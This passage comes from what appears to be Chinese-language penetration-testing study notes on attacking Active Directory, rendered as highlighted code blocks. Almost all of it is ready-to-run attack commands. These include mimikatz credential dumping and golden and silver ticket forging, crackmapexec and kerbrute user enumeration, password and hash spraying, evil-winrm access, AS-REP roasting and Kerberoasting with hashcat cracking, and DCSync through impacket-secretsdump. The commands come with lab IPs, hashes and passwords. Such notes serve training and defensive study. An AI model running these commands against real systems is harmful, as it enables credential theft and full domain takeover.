</span></span><span class="line"><span class="cl">	<span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>  <span class="c">###尝试从所有可用的来源中提取明文密码和密码哈 &gt; 大量输出</span>
</span></span><span class="line"><span class="cl">	<span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span>   <span class="c">###TGT TGS 显示存储在内存中的票据</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">###私钥导出</span>
</span></span><span class="line"><span class="cl">	<span class="n">crypto</span><span class="p">::</span><span class="n">capi</span>        <span class="c">###CryptoAPI函数</span>
</span></span><span class="line"><span class="cl">	<span class="n">crypto</span><span class="p">::</span><span class="n">cng</span>         <span class="c">###KeyIso服务</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">###silver ticket制作 生成白银票据</span>
</span></span><span class="line"><span class="cl">	<span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1987370270</span><span class="p">-</span><span class="n">658905905</span><span class="p">-</span><span class="n">1781884369</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">target</span><span class="err">:</span><span class="n">web04</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">http</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">4d28cf5252d39971419580a51484ca09</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">jeffadmin</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">###将NTLM hash转成Kerberos ticket</span>
</span></span><span class="line"><span class="cl">	<span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span>
</span></span><span class="line"><span class="cl">	 
</span></span><span class="line"><span class="cl">	<span class="c">###导出票据 </span>
</span></span><span class="line"><span class="cl">	<span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="p">/</span><span class="n">export</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">###导出krbtgt的NTLM和域SID</span>
</span></span><span class="line"><span class="cl">	<span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">patch</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">###删除所有现存的ticket</span>
</span></span><span class="line"><span class="cl">	<span class="n">kerberos</span><span class="p">::</span><span class="n">purge</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c">### 生成黄金票据 用户名要存在</span>
</span></span><span class="line"><span class="cl">	<span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">jen</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1987370270</span><span class="p">-</span><span class="n">658905905</span><span class="p">-</span><span class="n">1781884369</span> <span class="p">/</span><span class="n">krbtgt</span><span class="err">:</span><span class="n">1693c6cefafffc7af11ef34d1c788f47</span> <span class="p">/</span><span class="n">ptt</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">-----------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c"># AD认证介绍</span>
</span></span><span class="line"><span class="cl">	<span class="c">## NTLM身份验证介绍</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 客户端通过ip地址而不是主机名 或 对未在ad集成的dns服务器上注册的主机名进行验证时 会使用NTLM</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 认证过程 比较简单</span>
</span></span><span class="line"><span class="cl">			<span class="p">![</span><span class="n">image</span><span class="p">-</span><span class="n">20230816151936961</span><span class="p">](</span><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">cdn</span><span class="p">.</span><span class="n">jsdelivr</span><span class="p">.</span><span class="n">net</span><span class="p">/</span><span class="n">gh</span><span class="p">/</span><span class="n">klearcc</span><span class="p">/</span><span class="n">pic</span><span class="p">/</span><span class="n">img202308161519059</span><span class="p">.</span><span class="n">png</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="c">## Kerberos身份验证介绍 [[AD theoretical]] </span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="c">## 缓存的AD凭证</span>
</span></span><span class="line"><span class="cl">		<span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl">		<span class="n">mimikatz几个命令</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">-----------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c"># AD认证攻击 ad攻击</span>
</span></span><span class="line"><span class="cl">	<span class="p">--------</span> 
</span></span><span class="line"><span class="cl">			<span class="c">### 已登录账户</span>
</span></span><span class="line"><span class="cl">			<span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">130</span> <span class="n">-u</span> <span class="n">forend</span> <span class="n">-p</span> <span class="n">Klmcargo2</span> <span class="p">-</span><span class="n">-loggedon-users</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">	<span class="c">## 域用户枚举 枚举用户名</span>
</span></span><span class="line"><span class="cl">		<span class="n">1</span><span class="p">.</span> <span class="c">### cme枚举域用户</span>
</span></span><span class="line"><span class="cl">			<span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">5</span> <span class="n">-u</span> <span class="n">forend</span> <span class="n">-p</span> <span class="n">Klmcargo2</span> <span class="p">-</span><span class="n">-users</span>
</span></span><span class="line"><span class="cl">			<span class="n">nxc</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="n">UserNAme</span> <span class="n">-p</span> <span class="s1">&#39;PASSWORDHERE&#39;</span> <span class="p">-</span><span class="n">-rid-brute</span>
</span></span><span class="line"><span class="cl">		<span class="n">1</span><span class="p">.</span> <span class="c">### kerbrute</span>
</span></span><span class="line"><span class="cl">			<span class="n">kerbrute</span> <span class="n">userenum</span> <span class="n">-d</span> <span class="n">inlanefreight</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">5</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">jsmith</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl">		<span class="n">3</span><span class="p">.</span> <span class="c">### windapsearch</span>
</span></span><span class="line"><span class="cl">			<span class="n">python3</span> <span class="n">windapsearch</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-dc-ip</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">5</span> <span class="n">-u</span> <span class="n">forend</span><span class="nv">@inlanefreight</span><span class="p">.</span><span class="n">local</span> <span class="n">-p</span> <span class="n">Klmcargo2</span> <span class="p">-</span><span class="n">-da</span>
</span></span><span class="line"><span class="cl">				<span class="c">#-da 枚举域管理员组成员</span>
</span></span><span class="line"><span class="cl">				<span class="c">#-PU 查找特权用户</span>
</span></span><span class="line"><span class="cl">		<span class="n">4</span><span class="p">.</span> <span class="c">### bloodhound </span>
</span></span><span class="line"><span class="cl">		<span class="n">1</span><span class="p">.</span> <span class="n">rpcclient</span>  <span class="c">#前提能连上smb</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">	<span class="p">--------</span>
</span></span><span class="line"><span class="cl">	<span class="c">## AD密码喷洒</span>
</span></span><span class="line"><span class="cl">		<span class="n">0</span><span class="p">.</span> <span class="c">### 有加入域的Windows主机时 不需要提供user字典,不锁账户</span>
</span></span><span class="line"><span class="cl">		    <span class="n">ps</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">DomainPasswordSpray</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">		    <span class="n">ps</span><span class="p">&gt;</span> <span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-Password</span> <span class="n">Welcome1</span> <span class="n">-OutFile</span> <span class="n">spray_success</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></span><span class="line"><span class="cl">		    <span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-UserList</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Domain</span> <span class="nb">domain-name</span> <span class="n">-PasswordList</span> <span class="n">passlist</span><span class="p">.</span><span class="n">txt</span> <span class="n">-OutFile</span> <span class="nb">sprayed-creds</span><span class="p">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl">		    
</span></span><span class="line"><span class="cl">		<span class="n">1</span><span class="p">.</span> <span class="c">### 使用LDAP和ADSI  不需要提供user字典</span>
</span></span><span class="line"><span class="cl">			<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">ad</span><span class="p">/</span><span class="n">Tools</span><span class="p">/</span><span class="nb">Spray-Passwords</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">			<span class="p">.\</span><span class="nb">Spray-Passwords</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Pass</span> <span class="n">Mushroom</span><span class="p">!</span> <span class="n">-Admin</span> <span class="c">#-File 字典</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl"> 		<span class="n">2</span><span class="p">.</span> <span class="c">### SMB 流量大速度慢 net user /domain或get-netuser获取用户</span>
</span></span><span class="line"><span class="cl">				<span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">70</span><span class="p">-</span><span class="n">79</span> <span class="n">-u</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-p</span> <span class="s1">&#39;Nexus123!&#39;</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">-continue-on-success</span>
</span></span><span class="line"><span class="cl">				
</span></span><span class="line"><span class="cl">		<span class="n">3</span><span class="p">.</span> <span class="c">### smb hash喷洒</span>
</span></span><span class="line"><span class="cl">			<span class="c">###使用本地认证   </span>
</span></span><span class="line"><span class="cl">			  <span class="n">crackmapexec</span> <span class="n">smb</span>  <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">82</span><span class="p">-</span><span class="n">83</span>  <span class="n">-u</span> <span class="n">administrator</span> <span class="n">-H</span> <span class="n">f1014ac49bae005ee3ece5f47547d185</span>  <span class="p">-</span><span class="n">-local-auth</span>
</span></span><span class="line"><span class="cl">			<span class="c">###使用域认证</span>
</span></span><span class="line"><span class="cl">			<span class="n">crackmapexec</span> <span class="n">smb</span>  <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">82</span><span class="p">-</span><span class="n">83</span> <span class="n">-u</span> <span class="n">administrator</span> <span class="n">-H</span> <span class="n">f1014ac49bae005ee3ece5f47547d185</span>
</span></span><span class="line"><span class="cl">		<span class="n">4</span><span class="p">.</span> <span class="c">### winrm</span>
</span></span><span class="line"><span class="cl">			<span class="n">crackmapexec</span> <span class="n">winrm</span>   <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">82</span><span class="p">-</span><span class="n">83</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">10</span><span class="p">-</span><span class="n">14</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">120</span><span class="p">-</span><span class="n">122</span> <span class="n">-u</span> <span class="n">wario</span> <span class="n">-p</span> <span class="n">Mushroom</span><span class="p">!</span> <span class="p">-</span><span class="n">-continue-on-success</span>
</span></span><span class="line"><span class="cl">			<span class="nb">evil-winrm</span> <span class="n">-i</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">83</span> <span class="n">-u</span> <span class="n">wario</span> <span class="n">-p</span> <span class="s1">&#39;Mushroom!&#39;</span>
</span></span><span class="line"><span class="cl">			<span class="nb">evil-winrm</span> <span class="n">-i</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">81</span><span class="p">.</span><span class="n">142</span>  <span class="n">-u</span> <span class="n">celia</span><span class="p">.</span><span class="n">almeda</span> <span class="n">-H</span> <span class="n">e728ecbadfb02f51ce8eed753f3ff3fd</span>
</span></span><span class="line"><span class="cl">		<span class="n">1</span><span class="p">.</span> <span class="c">### 获取TGT 只使用两个UDP帧</span>
</span></span><span class="line"><span class="cl">			<span class="p">.\</span><span class="n">kerbrute_windows_amd64</span><span class="p">.</span><span class="n">exe</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">.\</span><span class="n">usernames</span><span class="p">.</span><span class="n">txt</span> <span class="s2">&#34;Nexus123!&#34;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="p">--------</span> 
</span></span><span class="line"><span class="cl">	<span class="c">## AS-REPRoasting解密码 条件：不进行Kerberos预身份验证,也就是kerberos前两步</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 查找开了此选项的用户</span>
</span></span><span class="line"><span class="cl">			<span class="n">kali</span><span class="p">&gt;</span> <span class="nb">impacket-GetNPUsers</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">70</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">pete</span>
</span></span><span class="line"><span class="cl">			<span class="n">或</span><span class="err">:</span><span class="n">win</span><span class="p">&gt;</span> <span class="n">powerview</span><span class="p">&gt;</span> <span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> 
</span></span><span class="line"><span class="cl">		<span class="c">### 利用 对有密码的账户直接利用，看是否可利用  不删hash</span>
</span></span><span class="line"><span class="cl">			<span class="n">kali</span><span class="p">&gt;</span> <span class="nb">impacket-GetNPUsers</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">70</span>  <span class="n">-request</span> <span class="n">-outputfile</span> <span class="n">hashes</span><span class="p">.</span><span class="n">asreproast</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">pete</span>
</span></span><span class="line"><span class="cl">			<span class="n">hashcat</span> <span class="p">-</span><span class="n">-help</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-i</span> <span class="s2">&#34;Kerberos&#34;</span>  <span class="p">&gt;&gt;</span> <span class="nb">AS-REP</span> <span class="n">18200</span>
</span></span><span class="line"><span class="cl">			<span class="n">sudo</span> <span class="n">hashcat</span> <span class="n">-m</span> <span class="n">18200</span> <span class="n">hashes</span><span class="p">.</span><span class="n">asreproast</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">-r</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">hashcat</span><span class="p">/</span><span class="n">rules</span><span class="p">/</span><span class="n">best64</span><span class="p">.</span><span class="n">rule</span> <span class="p">-</span><span class="n">-force</span>
</span></span><span class="line"><span class="cl">			<span class="n">或win</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">nowrap</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">	<span class="p">--------</span> 
</span></span><span class="line"><span class="cl">	<span class="c">## Kerberoasting SPN解密码  只在用户账户登录的情况下使用这种攻击方式 有可能spn的话(想要的账户在机器上登录) + 有域内任意账户密码</span>
</span></span><span class="line"><span class="cl">		<span class="n">kali</span><span class="p">&gt;</span> <span class="n">sudo</span> <span class="nb">impacket-GetUserSPNs</span> <span class="n">-request</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">99</span><span class="p">.</span><span class="n">146</span> <span class="n">oscp</span><span class="p">.</span><span class="n">exam</span><span class="p">/</span><span class="n">web_svc</span>
</span></span><span class="line"><span class="cl">		<span class="n">hashcat</span> <span class="p">-</span><span class="n">-help</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-i</span> <span class="s2">&#34;Kerberos&#34;</span><span class="p">&gt;&gt;</span><span class="nb">TGS-REP</span> <span class="n">13100不删</span>
</span></span><span class="line"><span class="cl">		<span class="n">sudo</span> <span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="n">hashes</span><span class="p">.</span><span class="n">kerberoast2</span>  <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">-r</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">hashcat</span><span class="p">/</span><span class="n">rules</span><span class="p">/</span><span class="n">best64</span><span class="p">.</span><span class="n">rule</span> <span class="p">-</span><span class="n">-force</span>
</span></span><span class="line"><span class="cl">		<span class="n">或</span><span class="err">:</span><span class="n">win</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">hashes</span><span class="p">.</span><span class="n">kerberoast</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="p">--------</span> 
</span></span><span class="line"><span class="cl">	<span class="c">## 伪造服务票据 Silver Tickets TGS伪造后可以访问特定服务</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 条件：应用程序并不验证服务票据中的用户和组权限，有对应服务账户（SPN）密码或其关联的NTLM哈希值</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 创建银票所需</span>
</span></span><span class="line"><span class="cl">			<span class="n">1</span> <span class="n">SPN</span> <span class="n">password</span> <span class="n">hash</span> <span class="n">SPN密码哈希</span>
</span></span><span class="line"><span class="cl">				<span class="n">mimikatz</span> <span class="n">服务账户的NTLM</span>
</span></span><span class="line"><span class="cl">			<span class="n">2</span> <span class="n">Domain</span> <span class="n">SID</span> <span class="n">域SID</span><span class="err">，</span><span class="n">不需要RID</span>
</span></span><span class="line"><span class="cl">				<span class="n">whoami</span> <span class="p">/</span><span class="n">user</span>
</span></span><span class="line"><span class="cl">			<span class="n">3</span> <span class="n">Target</span> <span class="n">SPN</span> <span class="n">目标</span> <span class="n">SPN</span>
</span></span><span class="line"><span class="cl">				<span class="n">HTTP</span><span class="p">/</span><span class="n">web04</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="err">:</span><span class="n">80</span>
</span></span><span class="line"><span class="cl">		<span class="c">### mimikatz创建</span>
</span></span><span class="line"><span class="cl">			<span class="n">mimikatz</span><span class="err">:</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1987370270</span><span class="p">-</span><span class="n">658905905</span><span class="p">-</span><span class="n">1781884369</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">target</span><span class="err">:</span><span class="n">web04</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">http</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">4d28cf5252d39971419580a51484ca09</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">jeffadmin</span>
</span></span><span class="line"><span class="cl">			<span class="n">ps</span><span class="p">&gt;</span> <span class="n">klist</span>
</span></span><span class="line"><span class="cl">			<span class="n">ps</span><span class="p">&gt;</span> <span class="nb">iwr </span><span class="n">-UseDefaultCredentials</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">web04</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">	<span class="p">--------</span>
</span></span><span class="line"><span class="cl">	<span class="c">## 域控制器同步 dcsync攻击 结果：可以请求任何用户凭据</span>
</span></span><span class="line"><span class="cl">		<span class="c">###域控冗余，会有多个互相复制，只验证相关的SID是否具有适当的权限</span>
</span></span><span class="line"><span class="cl">		<span class="c">###默认 域管理员、企业管理员和管理员组的成员 有这种权限</span>
</span></span><span class="line"><span class="cl">		<span class="c">###使用dcsync攻击伪装域控，从域中请求任何用户凭据</span>
</span></span><span class="line"><span class="cl">			<span class="c">##dave是目标用户名 ip为dc的ip 密码要转义</span>
</span></span><span class="line"><span class="cl">			<span class="n">kali</span><span class="p">&gt;</span> <span class="nb">impacket-secretsdump</span> <span class="n">-just-dc-user</span> <span class="n">dave</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">jeffadmin</span><span class="err">:</span><span class="s2">&#34;mima2023\!&#34;</span><span class="nv">@192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">70</span>
</span></span><span class="line"><span class="cl">			<span class="n">hashcat</span> <span class="n">-m</span> <span class="n">1000</span> <span class="n">hashes</span><span class="p">.</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="n">-r</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">hashcat</span><span class="p">/</span><span class="n">rules</span><span class="p">/</span><span class="n">best64</span><span class="p">.</span><span class="n">rule</span> <span class="p">-</span><span class="n">-force</span>
</span></span><span class="line"><span class="cl">			<span class="n">或win</span><span class="p">&gt;</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">corp</span><span class="p">\</span><span class="n">dave</span>  <span class="c">#dave是目标用户名</span>
</span></span><span class="line"><span class="cl">			
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="横向-持久化"><a href="#横向-持久化" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>横向 持久化</h3>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
